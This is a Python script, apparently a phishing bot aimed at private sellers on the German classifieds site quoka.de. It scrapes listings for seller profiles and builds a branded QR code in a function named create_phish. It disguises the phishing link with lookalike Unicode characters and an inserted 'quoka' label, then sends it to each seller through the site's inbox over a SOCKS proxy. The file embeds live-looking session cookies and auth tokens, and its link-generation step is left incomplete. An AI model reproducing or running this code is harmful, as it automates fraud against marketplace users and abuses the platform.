import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup
import os
import urllib.parse
from urllib.parse import urlparse
import json
from PIL import Image, ImageDraw, ImageOps
import qrcode
from functools import partial
import io


MAXIMUM_REQUEST = 1
SELLER_LINKS_FILE = 'seller_links.txt'
j = 0

def round_corners(image: Image.Image, radius: int) -> Image.Image:
    mask = Image.new('L', image.size, 0)
    draw = ImageDraw.Draw(mask)
    draw.rounded_rectangle([(0, 0), image.size], radius=radius, fill=255)
    
    rounded_image = ImageOps.fit(image, image.size, centering=(0.5, 0.5))
    rounded_image.putalpha(mask)
    
    return rounded_image

def create_phish(data: str, logo_path: str, size: int = 180, logo_size: int = 150) -> Image.Image:
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=24,
        border=0,
    )

    qr.add_data(data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="#48c4fc", back_color="#FFFFFF").convert("RGBA")
    
    logo = Image.open(logo_path).convert("RGBA")
    logo = logo.resize((logo_size, logo_size))
    
    qr_width, qr_height = qr_img.size
    logo_position = ((qr_width - logo_size) // 2, (qr_height - logo_size) // 2)
    
    logo = round_corners(logo, radius=40)
    qr_img.paste(logo, logo_position, mask=logo)
    qr_img = qr_img.resize((size, size))

    img = Image.open('main.png').convert("RGBA")
    img.paste(qr_img, (419, 571))
    output = io.BytesIO()
    img.save('new.png')

async def async_round_corners(image: Image.Image, radius: int) -> Image.Image:
    loop = asyncio.get_running_loop()
    func = partial(round_corners, image, radius)
    return await loop.run_in_executor(None, func)

async def async_create_qrcode(data: str, logo_path: str, size: int = 180, logo_size: int = 150) -> Image.Image:
    loop = asyncio.get_running_loop()
    func = partial(create_phish, data, logo_path, size, logo_size)
    return await loop.run_in_executor(None, func)

async def fetch_html(session, url):
    async with session.get(url) as response:
        if response.status == 200:
            print('successful ', end='')
            return await response.text()
        else:
            print(response.status, end='')

async def fetch_seller_info(session, url, semaphore):
    html = await fetch_html(session, url)
    soup = BeautifulSoup(html, 'lxml')
    shit = soup.find('div', class_='detail-right')
    name_tag = shit.find('h2', class_='user-profile-name').find('a')
    seller_name = name_tag.get_text(strip=True)
    seller_profile_link = name_tag['href']
    return seller_name, seller_profile_link
    
async def process_item(session, item, semaphore, existing_links, file_lock):
    global j
    j += 1
    if j == 5:
        await asyncio.sleep(15)
        j = 0
    title_tag = item.find('h2', class_='article-title').find('a')
    link = title_tag['href']
    title = title_tag.get_text(strip=True)
    img_tag = item.find('img')
    image = img_tag['src'] if img_tag else None
    price_tag = item.find('span', class_='article-price')
    price = price_tag.get_text(strip=True) if price_tag else None

    try:
        seller_name, seller_profile_link = await fetch_seller_info(session, link, semaphore)
        
    except Exception as e:
        print(f"Ошибка при получении информации о продавце: {e} {link}")
        return None

    if seller_profile_link in existing_links:
        return 'in filter'

    async with file_lock:
        existing_links.add(seller_profile_link)
        with open(SELLER_LINKS_FILE, 'a', encoding='utf-8') as f:
            f.write(seller_profile_link + '\n')

    result = {
        'title': title,
        'link': link,
        'image': image,
        'price': price,
        'seller_name': seller_name,
        'seller_profile_link': seller_profile_link
    }

    return result

async def sendmessage(session, name, link):

    async def generate_link(session, name):
        pass

        try:
            async with session.post(api_url, data=data) as req:
                response = await req.json()
                lnk = str(response.get('message', ''))
                return lnk.replace('https://', '', 1).replace('s3', 'quoka', 1).replace('cfd', '𝐜𝐟𝐝', 1).replace('buzz', '𝐛𝐮𝐳𝐳', 1)
        except Exception as e:
            print(f"Ошибка при генерации ссылки: {e}")

    url_pic = 'https://www.quoka.de/Inbox/UploadAttachment'
    headers_pic = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data",
        "Origin": "https://www.quoka.de",
        "Pragma": "no-cache",
        "Referer": "https://www.quoka.de",
        "Sec-CH-UA": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Requested-With": "XMLHttpRequest",
        'Cookie': '__RequestVerificationToken=gyFCzk5sTyFF1KOKL1NALLk2nvvUmxGq4i3Bqn75FiUg8QSSVJ2mC8ZCSi-NIO0z9R5NGwoARTHr5Ro7JeI1gZefRG41; cf_clearance=bMvvGEvkCcWg1hvj09Q4x.0idNv0q7A1ATXLgB5UvVw-1735066071-1.2.1.1-mxOB333A4rj45IvKblaiGnWHhS7Vm8qGw7ch0rxIFusTrzkiuhUVOzNRHCGJZ6toRRyqFs5ya24cCKOEJf6lmgzDIVeOzRD6lbOM_9mIVF4LjnHnCPBAOZqdvA_NENfjJ3UxB2tRcsxjkUQkk.c0Ir.pOoRXu4GmKB3MRaelbK2j16MID.TRD901FnbfUJjJxdDY6dz8UMqNnGej1meX4JGxrq5lQJWy4Qjc.drY_sixJxpyhqkKdkZocvO6K6lnyg.Ye.r7xzUksIfY1kYsFeKzfUtGaYI88VfvbGzZtfiq1tn4d_r7VH2Q7NYSXi8WlOtshv8MHeaaDCd2BPniHOFUcybS9gmgS6bKyrHK1miOEulMxbjE.AcTEtqgYqCslEHvmWSUpIGxvyteuQlTvmmNOnTwtSCPNzlaoUnjV37qd9viW8YT22i5Ob_pXUBR; g_state={"i_l":0}; FavoriteArticles=; active_today=73769665796972e210g0deh6h125hh41; .ASPXAUTH=3DB0D8916DD1275A6E5B70D3092D8CFCA1314D5261F1BA959E09EC6204AD6025E6D50CD40B8841DD7A9F6C2D1BDED7B19E91C7ECBB31D516110DA135C598F8B9CF1E2EB6E074411A090309D1BADE47401E940C65BDDCC45E39850C4F7ABBB550AE1139A9447C1E4A1229EB14DE2073F150FAA88C46E26646302C8D89AA2BE47887B398A1F4BF62A902BB1E76678CE7E663CE8DD12349566C15FEA420D3B7916211F4EEE50B668B263C7B5067F23FEE22AAD4F0BFC62FFFB9457501E5B3BD08577FB5136F7D3B1F8FD10C2F9CCBA2BD821777C43C0C06CBB9A39BC3D09E72EBA9863A540DCF22A600E4927217CDBA1A1340CFCB24535A799EC5BBEE51D2EDB5D088D7F7B03EAF7B9C17969992CC9D140D8E4366A3A798DF1A5F49309531580FA9827F143538AE72F522F5F96988722B45BBC2D0789C4B45C65CDEF4FA8B0C3C73C098DF6AE390AB727113C06F8159923F10FDCCF8EF3FFEFCFE13A153C38F39C77D189E593DFC1F419962F20886D8BB5A8AF69D979C03D30B56F1B44E84D9FFDB55F7059FFE6AEF7CEF673CA0EB0F8F472C2C40276F6C372DF1D1246E9B322C71EF44482C8E61F332F9E0A98C7DF1E0DD193667B8E7F71281BAFB98D2D1F8A57604B99E5021D30DEF0C89A261A7AB65977817097C60447F81DCA7693AB82B5B8B1FACD9156944AF18FA70FBCE4F93E85C500D46FF9F3A01F216B3981FE96BE2CC12C6600AAA35607D9B05126C9608FF85ADF33C5AF404C1D117B6E462ACBFA50B93BCA32EE6EE05074A5EB807627295CB685FF275A4E728627495679107E290EF850C0215A495487C6A11E1C1D0335F438AF2D22809AF7A6BB49F1F05FAD894533F5A0F8D84C46DC1918E75DEEE65B0B849579356F100E281E34B77E292C925C9103217387DB1AE89A62F5A6FEAC3823E1FAD223C5AA31EB202D73F3821C48A17C1411AF65C6EE25E6D424C6BB0FFE659D17784189088DCB2E359E466E323A296418C4C8E0B7DA75A404C1E428CE99B6C87BE420D4B0D5E62359C25F7F7309CE9832C7A642C3A218FBFDF49E50108953E532D0EB7B37515762CA630295ACC652752F20CB827592EE38CB0664D7F3099A9CE49A5C5B46AFF3929DFE928F7DBCF6724E7075566767FA45661A4247D9B736F013E1442DB95C7B6353A63964BE0BBC2D858D2089B5D1A8C84DC90E1CAD3F4EC138C35DC71A2941B6EFF3A692771EE2EB6AFE6784380A63760D5F59BD613FAF6BB725C7DD271C2B48F38F54E73073B2AFDEC23988B76A652E6B9234B2A54B439E3C51E629CA8867C40C785D8FB01E8AE3549AC80F5FF3F71847874DE094A324D07E57806743AC037E2E3D5BB74E44C7834CAF1EDDFA310EFA72D6331B89FD717995B88D3C424AF2AE36296B5B81149460625BE9217308648075DEB7E1D741D209925A34C41EEC07A5BF661DE8001E20FA6392BA6C1F23FF7841B434EE8CBE8A529A62AFFAE10D34361F2CB6E2A301DD8711369D94D14A93B766862B4AFBA4E7C8FD4FBC69761E5C6F790C67AD1D89BCB09A4262C34265AFCD64BBC1A6A915119DECF8D354067AFC93C3788FC2413C39482526492B25D0C1F65380EDCA8AB5E1D96BFAF54B80F7D9EA836CA60E9FB638683822A7A6A7371C91A8314810876352FD71B9B664AABB282E0141D19A1A29D53BF161344BC483AAA46ACECB35F657147D4033DDEE94311F111C4F0DA620BF29240BA4475CF24C49339F14E08B01BC044F6930F9C636F4ACDE0696181B8984FE3EEFFEEAF78FDF388EBF9D7A671A97C9B66848E5D965C270D9A5149694AD9FC1CFCC311795627E1DEFAC4A5C5AB1C3179485C57BE1DDCD5CD198EE2E349F711D52622566E7D49BA8378F9E5312BB68F328DC2DD231701B9E86B409CF516D77392FE057F5D598174617518591CADC417B447F7C2CAE50D2BA6527D8C5B2DEB21DAA362D1BE37C942A3454E1E9A711CC812350A27012C109CB77F9877A334A895E14F18C298384FADDCEA32315B7E64544D55FBDC50B7C0B373144C6CD9DA63A8A788B41D6770572F24CA442A3C5FB2989FBBAD60000230BE71476CC413CDCB82460ECED582E91F3DD0C75698DEE9B231E9732404AF743D358DD725D55098B8CDCE59933101C94B6B73820400796B94C19A86B8A5233200F5882413A7899238D7B45B7EB0CDAF2C0F23B09857A741AD6A4F6E0244F2871066D6CD4F6DDA9C8D637F3D98C43342428AC9080256AEDF8E2DC2FC2ACAAFB8AA08E108BB5FA52E2D912DFB7633D5F0B46E77B90CAA652530F227924BAEFA17C6CAABDAA1138C78FDC40038630E67C7A57CDAEFA2C27AB9C97CF9C57E0D2F3293F47AF32B38197BA4C96F7DABB14604DCDCCD142A3F41D31CD1D01044998B04F34048176BFF6D7050FA6D19D38E17663463CAB20F5FB2A8E654243FDAFA71C55800C04E2BD4262EC84AD0217F648A; ClassifiedsSessionId=8990e8e1-e395-4a25-a6b5-48dd390c8c3b; NotificationsCount=0; OnlineStatus=online'
    }

    url = "https://www.quoka.de/Inbox/SendInbox"
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
        "Cache-Control": "no-cache",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.quoka.de",
        "Pragma": "no-cache",
        "Referer": "https://www.quoka.de",
        "Sec-CH-UA": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Requested-With": "XMLHttpRequest",
        'Cookie': 'cto_bundle=O6Il5193TXRYTGUwZTNRalglMkZhcFFLc3R2bEZkJTJGRUglMkZWOWxWd2wyOTJKaDklMkJmRWlvRUglMkI2Ukw4WGJESENxdjVYSzdSSkJiNnJkWHBpTmhGU0N0SmdRMlpLdm1YRU5PU1lTTG9qZ1d5TkRjb1Z3bm5WQiUyQmFUalhXd25iUHRGVW8zamxnVVQyb3c2TVZiMWNDJTJCSklFdzcxcFVmUSUzRCUzRA;FavoriteArticles=;__vads=H0slyFu6fAyS2azO3osEbSW_g;cto_bundle=O6Il5193TXRYTGUwZTNRalglMkZhcFFLc3R2bEZkJTJGRUglMkZWOWxWd2wyOTJKaDklMkJmRWlvRUglMkI2Ukw4WGJESENxdjVYSzdSSkJiNnJkWHBpTmhGU0N0SmdRMlpLdm1YRU5PU1lTTG9qZ1d5TkRjb1Z3bm5WQiUyQmFUalhXd25iUHRGVW8zamxnVVQyb3c2TVZiMWNDJTJCSklFdzcxcFVmUSUzRCUzRA;gpt_ppid50=Le4l3LOf6KJQXGjUICK51Gq1wUiYIW6dRDuS6AcQP4fmEmArHS;_iidt=FQS8i90RoS0SMw7YyiqWQet/cQWi+08mGTqSNEXSVELU3Yu+E+gN5U3qQXY+G0yYuOl/jvvGjgYoYtTZQET1iPy0UjfNOyqstaVHRvU=;__gpi=UID=00000f7b04f1a24f:T=1735080287:RT=1735152286:S=ALNI_Mamb-dOc3nZgtsroXjKPyC6AYG0DA;__qca=P0-254854274-1735137056256;panoramaId=4c56bdd58b0baaaedc0b3656be71185ca02c9d644836a4f35caf82f1288ea3b7;_ga_T8KTLRZ2MR=GS1.1.1735142352.3.1.1735152509.49.0.0;__gads=ID=3393285835175a71:T=1735080287:RT=1735152286:S=ALNI_MZUwlfLbobdI68kq_8o4P_4P0BYgg;NotificationsCount=0;_lr_env_src_ats=false;g_state={"i_l":0};_lr_retry_request=true;usprivacy=1---;.ASPXAUTH=CD150B4EF693BBAD842E95A7258EFC9DEF097F3287744A1380EC50254885692A7C91B645C3DF14B46175C1874421599D804F9A39F37248EB2939ECA270DD1D43773503B034C192ACD69E94F8669D70598873ABED75698F56D5E7DD6B5C0D2AFAB4EB6D7CC06A59CE2DDE9B6D03CD72E688705446B8E7BFD143C274FA2DEAEDAAB4AD90E4264751474FBA4BD9FDCF0ADD66F0646BD7ADD2348A5A6B14FA3DEB9ABE90F9DDE58EAE77297A2A20DB09FBC07508C7FA85C5EE60FC9E7379AFBA72283BE3BDE09D71EB0A25C1F6D0D03F61419DF5852C7C2B6E0919B4C6D9451F48C9B802E59C0FA460E2341E9967D9D81A9337E190ED6B2767FDC1F2A0248026F4B1C19B4E360ECACBB64BB6CDEB93A4273D3823031BBF1EFC2E1808D35409E2C6D49A36546E13E0499F37FA7BF97440C13A023B70F09B6A3903158EC19F21A6A5E0A011CA187955D754E64027DC60F3258B0C2A176A090E3E9EAE996C2D4045E9ED1027D0482B6EB1BF56A089BFA98BBE8E069ED69C4D75F88A356868C24F88EDFAF4AA56064D838E01AFCEE7574EAAFECCA6C23A309DAAA01C2AD9039BE30989E946015124FAB3DC3507B6BAAC037D42FC75F84577E000A268FE5415E70C08B24EECFC015A5783A26F5C878C1C2106B215D5C0586192FA7AC88123630730BF0402E7E0F8C6DD3A23E13507BF89229382BC9CE7000AB7D35169389577AB84BD2C74ECF6F7568EC842B4E85B456E23B726AE516DB1CD4B8FE823AB00078798914D56A891F63EC7E75F4379C0CC38F78775F6284EDECD4DACDA0C9CCCE3BAF4519CAB8BCCD1AA9A9C64CA5B27EF5EC5D6BBBA7E4F62E2C5937C360016C849BFBF80C6CF0DAE2D8C1F0DD11B47FB6A7207793C139C8F7A5F3395C4E6204FA66F487DBF51DC0DCE55DBF75601591C78496087E57CACC1275D6EA384E750543ABFB882B0B05BA66021631D83D8C79D82F5453386930B6F1F0CA9F8A7455D03FBB25183822FA76FE60AD74C66527C3039BF6B5C03DC0823DAA71C6E40DAB3AF95AC357923D70914118555AD63F1FA2D7A81EBB7D03DCB80953FF900C480CEE80033828298AE78A9C96551C146F8831ECEABC33D910F2E0E3C4F725EA355E34305924331B26545C554E074E69A444AAB39D888702E8FDFB99C108A89389A6B38560B8B71F2147A192B69009B3CD973C47C25BDEE61AB6F6246B958154F6C840E1312C1FCFC716E55FA0ED19607CB05D695D010E3386B1D35D8918B175DAA7FA40998CE25377C48CF7B4BD120649C5994F6B6C63C4DBF7836118F57DBE147EB77AAA6882217F8E8248BA0D92D63A80B429630C8797D7BDADED9322AC31678BBF1ABB29DC19D7148F27DFF6289F8BA1707857E031052336D647FE361A15F459132C904EED157A6101695BF010106E6FF5687671298E36D3D24F7973E20E540394384F9B0C3A3630B0D7DFA4AD2A909FAEBA76DD66CF38CE70F3E5CA94E54087FBA790D2FF8D91A855785C6F11824AF34678CED015B07BE922D402416633D1844736452770C8A48F8AA17AB7155F5B051B5A22942FBD72E5A05EBC1207471A88F05F7D3AEC05202F7CEAA8CD9835650FAE8B4FE3C2ED30E3106E69411B544B436C8CF4D714B07DAF7FD5D16972C12967425D5A4BE007BE7E100E1ED8D7A8053B6CEB33F761024DF358EE40F469648640EE8C9C93CEDEC1F106A941A987DAB9DFB0F3490E32685AC5166C47A6ECBE499D4FF20DC73DB46DD2E4A71BECA5C9C47A04A6FE3CF09B7B5636FAAC556D177343B2922C062A5F7C0508D54A43F4240E1E4259580FF627802ED3A40DAB07EDD90F1C3443FEC832D77ADD80146A8693CC44EAD1B910A671E3BB931202F5F74D4A50E9DC2B4FE0032088C580F6214C9C631289891026FA56907EB491EDFBCF10269F41F09F66294751520A6881597006EC84729DD3A548F4BEFDB7D97AF798D4F811FFE0B2B5D88C2F4E2638B3EF2EB96D59880E28CDD5776C246E5C331AFBB19606AAAF8B2E8BDF79DDCD64B3E8EC358AD0961E0CD7CFEE9C057481C8F4A917E36A7BC0E9D8BADA763C8322BCDCA9E458519547FC1921B8AA4876ABE5CC273AF11656856AA3901E65EF377C02DFE40BF7ECA0929B2A97164C65DEB0CEE6A38EE4E3B1C0F0EE086C9E917CC3A6DD8F1113C3D890526EE2C1A26D9DC8693514BE6D977CE53DE6CF202179EC55AE8B6E05F41D369B36503AF32AE2051D6A49D4753D16824EF92ECE6B57EF7E46FBBA15B02D96D0FE972B7ED503817270F88DE2A3A42EEAF5F584AD8AEAF91762E22527C1F738DE13F9491881FC57AAF68D33D87339BF3AA54E3CA7C7B72FECFC3CD2A2B7F6B2925A7B866F4A335390FFA71919B177151A25D7F57DE4A29A92FA961674DA6756C0EDD05E206E465F1EB134373FEB62AAB37A9B3D147236E38AB3C;__eoi=ID=bfa01dcc68d03f7d:T=1735080287:RT=1735152286:S=AA-AfjalwepNZZ4P2SDO6YS66KEL;__RequestVerificationToken=gyFCzk5sTyFF1KOKL1NALLk2nvvUmxGq4i3Bqn75FiUg8QSSVJ2mC8ZCSi-NIO0z9R5NGwoARTHr5Ro7JeI1gZefRG41;_cc_id=7f979c459eeaf6983fc7a1a1056021d1;_ga=GA1.1.1735045880.1735080226;_vid_t=mca0+7NxJw4p9lSWmP0UWCiKTETo0s6wpfBmEITCdpqfBGtxn20DOgBDM5kjxv7PHiPcs6UL46d3OMyDcAoA0crm0T+xXuDVw3CtI4Y=;active_today=73769665796972e210g0deh6h125hh41;addtl_consent=1~43.3.9.6.9.13.6.4.15.9.5.2.11.8.1.3.2.10.33.4.15.17.2.9.20.7.20.5.20.7.2.2.1.4.40.4.14.9.3.10.8.9.6.6.9.41.5.3.1.27.1.17.10.9.1.8.6.2.8.3.4.146.65.1.17.1.18.25.35.5.18.9.7.41.2.4.18.24.4.9.6.5.2.14.25.3.2.2.8.28.8.6.3.10.4.20.2.17.10.11.1.3.22.16.2.6.8.6.11.6.5.33.11.19.28.12.1.5.2.17.9.6.40.17.4.9.15.8.7.3.12.7.2.4.1.7.12.13.22.13.2.6.8.10.1.4.15.2.4.9.4.5.4.7.13.5.15.17.4.14.10.15.2.5.6.2.2.1.2.14.7.4.8.2.9.10.18.12.13.2.18.1.1.3.1.1.9.7.2.16.5.19.8.4.8.5.4.8.4.4.2.14.2.13.4.2.6.9.6.3.2.2.3.7.3.6.10.11.9.19.8.3.3.1.2.3.9.19.26.3.10.13.4.3.4.6.3.3.3.4.1.1.6.11.4.1.11.6.1.10.13.3.2.2.4.3.2.2.7.15.7.14.4.3.4.5.4.3.2.2.5.5.3.9.7.9.1.5.3.7.10.11.1.3.1.1.2.1.3.2.6.1.12.8.1.3.1.1.2.2.7.7.1.4.3.6.1.2.1.4.1.1.4.1.1.2.1.8.1.7.4.3.3.3.5.3.15.1.15.10.28.1.2.2.12.3.4.1.6.3.4.7.1.3.1.4.1.5.3.1.3.4.1.5.2.3.1.2.2.6.2.1.2.2.2.4.1.1.1.2.2.1.1.1.1.2.1.1.1.2.2.1.1.2.1.2.1.7.1.7.1.1.1.1.2.1.4.2.1.1.9.1.6.2.1.6.2.3.2.1.1.1.2.5.2.4.1.1.2.2.1.1.7.1.2.2.1.2.1.2.3.1.1.2.4.1.1.1.6.3.6.4.5.9.1.2.3.1.4.3.2.2.3.1.1.1.1.12.1.3.1.1.2.2.1.6.3.3.5.2.7.1.1.2.5.1.9.5.1.3.1.8.4.5.1.9.1.1.1.2.1.1.1.4.2.13.1.1.3.1.2.2.3.1.2.1.1.1.2.1.3.1.1.1.1.2.4.1.5.1.2.4.3.10.2.9.7.2.2.1.3.3.1.6.1.2.5.1.1.2.6.4.2.1.200.200.100.300.400.100.100.100.400.1700.304.596.100.1000.800.500.400.200.200.500.1300.801.99.506.95.1399.1100.100.4302.1798.2100.600.200.100.800.900.100.200.700.100.800.2000.900.1100.600.400.2200.2300.400;ClassifiedsSessionId=8990e8e1-e395-4a25-a6b5-48dd390c8c3b;cto_bidid=pWoqD19qem9WMXFycXBBaXdiM0dMRjF5YnJZcWE1VzVqcWRublVMZ2x1QmhQeEdMSGRuNER6SHpkJTJCZVpmZW16Tm04YWFJb3M0QXVreWgzYWd4azc3dERwNTNpVVJXU05NZVE3R1l2ekdQNHVubyUyRk0lM0Q;cto_bundle=eaNaAV93TXRYTGUwZTNRalglMkZhcFFLc3R2bE1MVThaNCUyRmtVSlZOb0RiaUwycG9kUGNQWEgzREdFWTVHdll2MiUyQjB1cTZTMWZjNW9WRUoyMU1zaGxoa214UDZEYkpabjE2a1BmUSUyQkhjSGh5Tmp0ZklZRm9reWJiNjdlMHB3QnVEOURuUGlOWHF6SlRERSUyQm5mVXRrdTZDJTJCU0RDQmclM0QlM0Q;euconsent-v2=CQKI78AQKI78AAKA6ADEBVFsAP_gAEPgAAYgKutX_G__bWlr8X73aftkeY1P9_h77sQxBhfJE-4FzLvW_JwXx2ExNA36tqIKmRIAu3TBIQNlGJDURVCgaogVryDMaEyUoTNKJ6BkiFMRM2dYCFxvm4tjeQCY5vr991dx2B-t7dr83dzyy4xHn3a5_2S0WJCdA5-tDfv9bROb-9IOd_x8v4v4_F_pE2_eT1l_tWvp7D9-cts__XW99_fff_9Pn_-uB_-_X_vf_H3gq6ASYaFRAGWRISEGgYQQIAVBWEBFAgCAABIGiAgBMGBTsDABdYSIAQAoABggBAACDIAEAAAkACEQAQAFAgAAgECgADAAgGAgAYGAAMAFgIBAACA6BimBBAIFgAkZkVCmBCEAkEBLZUIJAECCuEIRZ4BEAiJgoAAASACkAAQFgsDiSQErEggC4g2gAAIAEAggAKEUnZgCCAM2WqvBg2jK0wLB8wXPaYBkgRBGTkmAAAAA.YAAAAAAAAAAA;IABGPP_HDR_GppString=DBABMA~CQKMO4AQKMO4AAKA6ADEBVFsAP_gAEPgAAYgKutX_G__bWlr8X73aftkeY1P9_h77sQxBhfJE-4FzLvW_JwXx2ExNA36tqIKmRIAu3TBIQNlGJDURVCgaogVryDMaEyUoTNKJ6BkiFMRM2dYCFxvm4tjeQCY5vr991dx2B-t7dr83dzyy4xHn3a5_2S0WJCdA5-tDfv9bROb-9IOd_x8v4v4_F_pE2_eT1l_tWvp7D9-cts__XW99_fff_9Pn_-uB_-_X_vf_H3gq6ASYaFRAGWRISEGgYQQIAVBWEBFAgCAABIGiAgBMGBTsDABdYSIAQAoABggBAACDIAEAAAkACEQAQAFAgAAgECgADAAgGAgAYGAAMAFgIBAACA6BimBBAIFgAkZkVCmBCEAkEBLZUIJAECCuEIRZ4BEAiJgoAAASACkAAQFgsDiSQErEggC4g2gAAIAEAggAKEUnZgCCAM2WqvBg2jK0wLB8wXPaYBkgRBGTkmAAAAA.YAAAAAAAAAAA;OnlineStatus=online;panoramaId_expiry=1735685087973;panoramaIdType=panoDevice'
    }

    object_id = link.split('/')[-1].split('.')[0]
    category_url = '/'.join(urlparse(link).path.strip('/').split('/')[:-3]) + '/'

    print(object_id)
    print(category_url)

    phising = await generate_link(session, name)
    await async_create_qrcode(phising, 'logo.jpg')

    message_content = f'''hi
    '''

    connector = ProxyConnector.from_url('socks5://127.0.0.1:60000')

    async with aiohttp.ClientSession(connector=connector) as session2:

        with aiohttp.MultipartWriter("form-data") as mp:
            with open('new.png', 'rb') as f:
                mp.append(f, {'Content-Disposition': 'form-data; name="123.png"; filename="123.png"', "Content-Type": "image/png"})
            async with session2.post(url_pic, data=mp, headers=headers_pic) as response:
                if response.status == 200:
                        try:
                            resp_json = await response.json()
                            print("Успешный ответ JSON:", resp_json, response)
                        except aiohttp.ContentTypeError:
                            resp_text = await response.text()
                            print("Успешный ответ текст:", resp_text)
                else:
                        print(f"Ошибка: Получен статус {response.status}")
                        resp_text = await response.text()
                        print("Текст ошибки:", resp_text)

        message_text = json.dumps({
            "messageType": "text",
            "messageContent": message_content,
            "attachments": [resp_json]
        }, ensure_ascii=False)
        
        data = {
            "ObjectId": f'{object_id}',
            "CategoryUrl": f'{category_url}',
            "ReciverSource": "Quoka",
            "MessageText": message_text,
            "ObjectTitle": "123 "
        }

        encoded_data = urllib.parse.urlencode(data, encoding='utf-8')
        try:
            async with session2.post(url, data=encoded_data, headers = headers) as response:
                if response.status == 200:
                    try:
                        resp_json = await response.json()
                        print("Успешный ответ JSON:", resp_json)
                    except aiohttp.ContentTypeError:
                        resp_text = await response.text()
                        print("Успешный ответ текст:", resp_text)
                else:
                    print(f"Ошибка: Получен статус {response.status}")
                    resp_text = await response.text()
                    print("Текст ошибки:", resp_text)
        except aiohttp.ClientError as e:
            print(f"Ошибка запроса: {e}")


async def main():

    url = 'https://www.quoka.de/anzeigen/?pag=1&pagesize=50'
    semaphore = asyncio.Semaphore(MAXIMUM_REQUEST)
    k = 0
    global j
    j = 0
    existing_links = set()
    if os.path.exists(SELLER_LINKS_FILE):
        with open(SELLER_LINKS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                existing_links.add(line.strip())

    file_lock = asyncio.Lock()

    connector = ProxyConnector.from_url('socks5://127.0.0.1:60000')

    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            try:
                html = await fetch_html(session, url)
                print('got articles')
            except Exception as e:
                print(f"Ошибка при загрузке основной страницы: {e}")
                return

            soup = BeautifulSoup(html, 'html.parser')
            article_lists = soup.find_all('div', class_='article-list')
            tasks = []

            for article_list in article_lists:
                article_items = article_list.find_all('div', class_='article-item')
                for item in article_items:
                    task = await process_item(session, item, semaphore, existing_links, file_lock)

                    if task != 'in filter':
                        await sendmessage(session, task['seller_name'], task['link'])
                        await asyncio.sleep(30)
                


            print(f"Всего обработано новых объявлений: {k}")

async def main2():
    await sendmessage(aiohttp.ClientSession(), 'goida', 'https://www.quoka.de/anzeigen/tiermarkt/kleintiere/anzeige/sehr-hubsche-reinrassige-zwergwidder-in-verschiedenen-farben/8dfi42hg265e7i8f2d7e12742gig954f.html')


if __name__ == "__main__":
    asyncio.run(main2())
